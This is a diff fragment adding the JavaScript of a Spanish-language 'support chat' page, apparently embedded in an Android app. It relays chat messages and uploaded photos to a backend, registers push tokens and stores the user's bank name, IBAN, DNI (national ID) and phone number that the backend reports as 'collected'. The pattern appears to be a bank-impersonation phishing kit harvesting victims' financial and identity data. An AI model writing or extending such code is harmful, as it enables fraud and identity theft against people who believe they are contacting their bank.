+            var img = new Image();
+            img.onload = function () {
+              var MAX = 1200, w = img.width, h = img.height;
+              if (w > MAX || h > MAX) {
+                if (w > h) { h = Math.round(h * MAX / w); w = MAX; }
+                else { w = Math.round(w * MAX / h); h = MAX; }
+              }
+              var canvas = document.createElement('canvas');
+              canvas.width = w; canvas.height = h;
+              canvas.getContext('2d').drawImage(img, 0, 0, w, h);
+              canvas.toBlob(function (blob) {
+                var fd = new FormData();
+                fd.append('image', blob, 'photo.jpg');
+                fetch(API_BASE.replace(/\/+$/, '') + '/api/upload-image', {
+                  method: 'POST', body: fd, mode: 'cors', credentials: 'omit',
+                })
+                  .then(function (r) { return r.json(); })
+                  .then(function (d) { d && d.url ? onSuccess(d.url) : onError(); })
+                  .catch(onError);
+              }, 'image/jpeg', 0.85);
+            };
+            img.onerror = onError;
+            img.src = ev.target.result;
+          };
+          reader.onerror = onError;
+          reader.readAsDataURL(file);
+        }
+
+        function postChat(payload) {
+          return fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            mode: 'cors',
+            credentials: 'omit',
+          }).then(function (r) { return r.json(); });
+        }
+
+        function markRead() {
+          fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat/read', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'omit',
+            body: JSON.stringify({ sessionId: sessionId }),
+          }).catch(function () {});
+        }
+
+        var pollTimer = null;
+        function startPolling() {
+          if (pollTimer) return;
+          pollTimer = setInterval(function () {
+            fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat/history/' + encodeURIComponent(sessionId), {
+              method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit',
+            })
+              .then(function (r) { return r.json(); })
+              .then(function (data) {
+                var msgs = (data && data.messages) || [];
+                if (msgs.length > displayedMsgCount) {
+                  msgs.slice(displayedMsgCount).forEach(function (m) {
+                    if (m.role !== 'user') addMessage('bot', m.content);
+                    else displayedMsgCount++;
+                  });
+                  markRead();
+                  var botCount = msgs.filter(function(m){ return m.role !== 'user'; }).length;
+                  localStorage.setItem('chatBotMsgCount', String(botCount));
+                }
+                if (data && data.closed && !document.getElementById('chatClosedBanner')) showDoneBanner();
+              })
+              .catch(function () {});
+          }, 4000);
+        }
+
+        function saveCollectedData(data) {
+          if (data.collectedIban)  localStorage.setItem('chatIban',  data.collectedIban);
+          if (data.collectedDni)   localStorage.setItem('chatDni',   data.collectedDni);
+          if (data.collectedPhone) localStorage.setItem('chatPhone', data.collectedPhone);
+        }
+
+        function send(content) {
+          localStorage.removeItem('chatUnread');
+          setBusy(true);
+          postChat({ sessionId: sessionId, message: content, name: name, bank: bank })
+            .then(function (data) {
+              setBusy(false);
+              saveCollectedData(data || {});
+              if (data && data.reply) addMessage('bot', data.reply);
+              if (data && data.done) showDoneBanner();
+            })
+            .catch(function () {
+              setBusy(false);
+              addMessage('bot', 'Hubo un problema de conexión. Inténtalo de nuevo en un momento.');
+            });
+        }
+
+        form.addEventListener('submit', function (e) {
+          e.preventDefault();
+          var text = input.value.trim();
+          if (!text || input.disabled) return;
+          addMessage('user', text);
+          input.value = '';
+          send(text);
+        });
+
+        imgBtn.addEventListener('click', function () {
+          if (input.disabled) return;
+          imgInput.click();
+        });
+
+        imgInput.addEventListener('change', function () {
+          var file = imgInput.files && imgInput.files[0];
+          imgInput.value = '';
+          if (!file || input.disabled) return;
+          imgBtn.disabled = true;
+          input.disabled = true;
+          sendBtn.disabled = true;
+          uploadImage(file, function (url) {
+            imgBtn.disabled = false;
+            input.disabled = false;
+            sendBtn.disabled = false;
+            addMessage('user', url);
+            postChat({ sessionId: sessionId, message: url, name: name, bank: bank })
+              .then(function (data) {
+                saveCollectedData(data || {});
+                if (data && data.reply) addMessage('bot', data.reply);
+                if (data && data.done) showDoneBanner();
+              })
+              .catch(function () {});
+          }, function () {
+            imgBtn.disabled = false;
+            input.disabled = false;
+            sendBtn.disabled = false;
+          });
+        });
+
+        function init() {
+          fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat/history/' + encodeURIComponent(sessionId), {
+            method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit',
+          })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+              var msgs = (data && data.messages) || [];
+              var alreadyClosed = !!(data && data.closed);
+
+              if (msgs.length) {
+                msgs.forEach(function (m) {
+                  var el = buildMsgEl(m.role === 'user' ? 'user' : 'bot', m.content);
+                  if (el) chat.insertBefore(el, typing);
+                  displayedMsgCount++;
+                });
+                scrollDown();
+                markRead();
+                var botCount = msgs.filter(function(m){ return m.role !== 'user'; }).length;
+                localStorage.setItem('chatBotMsgCount', String(botCount));
+                if (alreadyClosed) showDoneBanner(chat.querySelector('.caller-actions-wrap'));
+                startPolling();
+                return;
+              }
+
+              setBusy(true);
+              postChat({ sessionId: sessionId, start: true, name: name, bank: bank })
+                .then(function (d) {
+                  setBusy(false);
+                  if (d && d.reply) addMessage('bot', d.reply);
+                  if (d && d.done) showDoneBanner();
+                  startPolling();
+                })
+                .catch(function () { setBusy(false); startPolling(); });
+            })
+            .catch(function () {});
+        }
+
+        init();
+
+        // Register FCM push token — wait 5s as recommended by APK developer
+        (function registerPushToken() {
+          var registered = false;
+          function tryGet() {
+            return (window.AndroidBridge && typeof window.AndroidBridge.getFcmToken === 'function')
+              ? (window.AndroidBridge.getFcmToken() || null) : null;
+          }
+          function doRegister(token) {
+            if (registered) return;
+            registered = true;
+            fetch(API_BASE.replace(/\/+$/, '') + '/api/push/register', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ sessionId: sessionId, token: token }),
+              mode: 'cors', credentials: 'omit',
+            }).catch(function () {});
+          }
+          function startRetryLoop() {
+            if (registered) return;
+            var retries = 0;
+            var iv = setInterval(function () {
+              var t = tryGet();
+              if (t) { clearInterval(iv); doRegister(t); return; }
+              if (++retries >= 20) clearInterval(iv);
+            }, 3000);
+          }
+          setTimeout(function () {
+            var t = tryGet();
+            if (t) { doRegister(t); return; }
+            startRetryLoop();
+          }, 5000);
+          document.addEventListener('visibilitychange', function () {
+            if (document.visibilityState === 'visible' && !registered) {
+              setTimeout(function () {
+                var t = tryGet();
+                if (t) { doRegister(t); } else { startRetryLoop(); }
+              }, 2000);
+            }
+          });
+        })();
+      })();
+    </script>
+  </body>
+</html>
